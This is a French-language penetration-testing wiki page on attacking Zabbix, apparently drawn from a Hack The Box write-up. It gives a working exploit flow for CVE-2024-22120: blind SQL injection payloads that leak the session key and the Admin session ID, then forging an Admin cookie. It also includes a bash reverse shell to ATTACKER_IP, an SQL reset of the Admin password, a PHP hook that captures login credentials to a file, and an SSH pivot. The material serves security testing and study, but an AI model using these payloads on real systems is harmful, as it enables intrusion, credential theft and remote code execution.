# Sécurité de Zabbix

{{#include ../../banners/hacktricks-training.md}}

## Aperçu

Zabbix est une plateforme de monitoring exposant une web UI (typiquement derrière Apache/Nginx) et un composant serveur qui communique aussi via le protocole Zabbix sur TCP/10051 (server/trapper) et un agent sur TCP/10050. Lors des engagements vous pouvez rencontrer :

- Web UI: hôte virtuel HTTP(S) comme zabbix.example.tld
- Port du serveur Zabbix: 10051/tcp (JSON over a ZBXD header framing)
- Port de l'agent Zabbix: 10050/tcp

Format utile du cookie : zbx_session est le Base64 d'un objet JSON compact qui inclut au minimum sessionid, serverCheckResult, serverCheckTime et sign. Le sign est un HMAC du payload JSON.

## zbx_session cookie internals

Les versions récentes de Zabbix calculent le cookie comme suit :

- data JSON: {"sessionid":"<32-hex>","serverCheckResult":true,"serverCheckTime":<unix_ts>}
- sign: HMAC-SHA256(key=session_key, data=JSON string of data sorted by keys and compact separators)
- Cookie final: Base64(JSON_with_sign)

Si vous pouvez récupérer le session_key global et un sessionid Admin valide, vous pouvez forger un cookie Admin valide hors-ligne et vous authentifier à l'UI.

## CVE-2024-22120 — Time-based blind SQLi dans le journal d'audit de Zabbix Server

Versions affectées (d'après la documentation publique) :

- 6.0.0–6.0.27, 6.4.0–6.4.12, 7.0.0alpha1

Résumé de la vulnérabilité :

- Lorsqu'une exécution de Script est enregistrée dans le journal d'audit de Zabbix Server, le champ clientip n'est pas assaini et est concaténé dans le SQL, permettant une time-based blind SQLi via le composant serveur.
- Cela est exploitable en envoyant une requête "command" spécialement construite au port 10051 du serveur Zabbix avec un sessionid valide à faible privilège, un hostid accessible par l'utilisateur, et un scriptid autorisé.

Conditions préalables et conseils de découverte :

- sessionid : depuis guest/login dans la web UI, décodez zbx_session (Base64) pour obtenir le sessionid.
- hostid : observez via les requêtes de la web UI (p.ex., Monitoring → Hosts) ou interceptez avec un proxy ; la valeur par défaut courante est 10084.
- scriptid : seuls les scripts permis au rôle courant s'exécuteront ; vérifiez en inspectant le menu des scripts / les réponses AJAX. Des valeurs par défaut comme 1 ou 2 sont souvent autorisées ; 3 peut être refusé.

### Flux d'exploitation

1) Déclencher l'insertion d'audit avec une SQLi dans clientip

- Connectez-vous à TCP/10051 et envoyez un message encadré Zabbix avec request="command" incluant sid, hostid, scriptid, et clientip défini sur une expression SQL qui sera concaténée par le serveur et évaluée.

Champs minimaux du message (corps JSON) :
```json
{
"request": "command",
"sid": "<low-priv-sessionid>",
"scriptid": "1",
"clientip": "' + (SQL_PAYLOAD) + '",
"hostid": "10084"
}
```
Le format wire complet est : "ZBXD\x01" + 8-byte little-endian length + UTF-8 JSON. Vous pouvez utiliser pwntools ou votre propre code socket pour le formater.

2) Time-bruteforce secrets via conditional sleep

Utilisez des expressions conditionnelles pour leak des secrets encodés en hex un caractère à la fois en mesurant le temps de réponse. Exemples qui ont fonctionné en pratique :

- Leak global session_key from config:
```sql
(select CASE WHEN (ascii(substr((select session_key from config),{pos},1))={ord}) THEN sleep({T_TRUE}) ELSE sleep({T_FALSE}) END)
```
- Leak Admin session_id (userid=1) à partir de sessions:
```sql
(select CASE WHEN (ascii(substr((select sessionid from sessions where userid=1 limit 1),{pos},1))={ord}) THEN sleep({T_TRUE}) ELSE sleep({T_FALSE}) END)
```
Notes :

- charset : 32 hex caractères [0-9a-f]
- Choisir T_TRUE >> T_FALSE (par ex., 10 vs 1) et mesurer le temps réel par tentative
- Assurez-vous que votre scriptid est réellement autorisé pour l’utilisateur ; sinon aucune entrée d'audit n’est produite et la mesure ne fonctionnera pas

3) Forger le cookie Admin

Une fois que vous avez :

- session_key : 32-hex provenant de config.session_key
- admin_sessionid : 32-hex provenant de sessions.sessionid pour userid=1

Calculer :

- sign = HMAC_SHA256(key=session_key, data=json.dumps({sessionid, serverCheckResult:true, serverCheckTime:now}, sort by key, compact))
- zbx_session = Base64(JSON_with_sign)

Définissez le cookie zbx_session sur cette valeur et effectuez un GET /zabbix.php?action=dashboard.view pour valider l’accès Admin.

### Outils prêts à l'emploi

- Public PoC automatise : bruteforce de session_key et admin sessionid, et falsification du cookie ; nécessite pwntools et requests.
- Les paramètres à fournir incluent typiquement : --ip (FQDN de l'UI), --port 10051, --sid (low-priv), --hostid, et optionnellement un --admin-sid connu pour éviter le bruteforce.

## RCE via Script execution (post-Admin)

Avec un accès Admin dans l'UI, vous pouvez exécuter des Scripts prédéfinis contre des hôtes monitorés. Si les agents/hôtes exécutent localement les commandes de script, cela donne une exécution de code sur ces systèmes (souvent en tant qu'utilisateur zabbix sur les hôtes Linux) :

- Vérification rapide : exécutez id pour confirmer le contexte utilisateur
- Exemple de reverse shell :
```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'
```
Passage à un TTY complet (Linux) :
```bash
script /dev/null -c bash
# background with Ctrl+Z, then on attacker terminal:
stty raw -echo; fg
reset
```
Si vous avez DB access, une alternative à forging a cookie est de réinitialiser le mot de passe Admin au bcrypt documenté pour "zabbix":
```sql
UPDATE users SET passwd='$2a$10$ZXIvHAEP2ZM.dLXTm6uPHOMVlARXX7cqjbhM6Fn0cANzkCQBWpMrS' WHERE username='Admin';
```
## Credential capture via login hook (post-exploitation)

Si l'écriture de fichiers est possible sur le serveur web UI, vous pouvez ajouter temporairement un extrait de logging dans /usr/share/zabbix/index.php autour de la branche de connexion par formulaire pour capturer les credentials:
```php
// login via form
if (hasRequest('enter') && CWebUser::login(getRequest('name', ZBX_GUEST_USER), getRequest('password', ''))) {
$user = $_POST['name'] ?? '??';
$password = $_POST['password'] ?? '??';
$f = fopen('/dev/shm/creds.txt','a+'); fputs($f, "$user:$password\n"); fclose($f);
CSessionHelper::set('sessionid', CWebUser::$data['sessionid']);
}
```
Les utilisateurs s'authentifient normalement; lire /dev/shm/creds.txt ensuite. Supprimer le hook une fois terminé.

## Pivoting to internal services

Même si le shell du compte de service est /usr/sbin/nologin, ajouter une entrée authorized_keys SSH et utiliser -N -L permet le local port-forwarding vers des services accessibles uniquement depuis loopback (par ex., CI/CD sur le port 8111) :
```bash
ssh -i key user@host -N -L 8111:127.0.0.1:8111
```
Voir plus de modèles de tunneling : Check [Tunneling and Port Forwarding](../../generic-hacking/tunneling-and-port-forwarding.md).

## Conseils opérationnels

- Valider que scriptid est autorisé pour le rôle actuel (guest peut avoir un ensemble limité)
- Le Timing brute peut être lent ; mettre en cache la sessionid admin récupérée et la réutiliser
- Le JSON envoyé à 10051 doit être encadré par l'en-tête ZBXD\x01 et une longueur little-endian

## Références

- [HTB Watcher — Zabbix CVE-2024-22120 to Admin/RCE and TeamCity root pivot](https://0xdf.gitlab.io/2025/10/09/htb-watcher.html)
- [CVE-2024-22120-RCE toolkit (PoC scripts)](https://github.com/W01fh4cker/CVE-2024-22120-RCE)

{{#include ../../banners/hacktricks-training.md}}
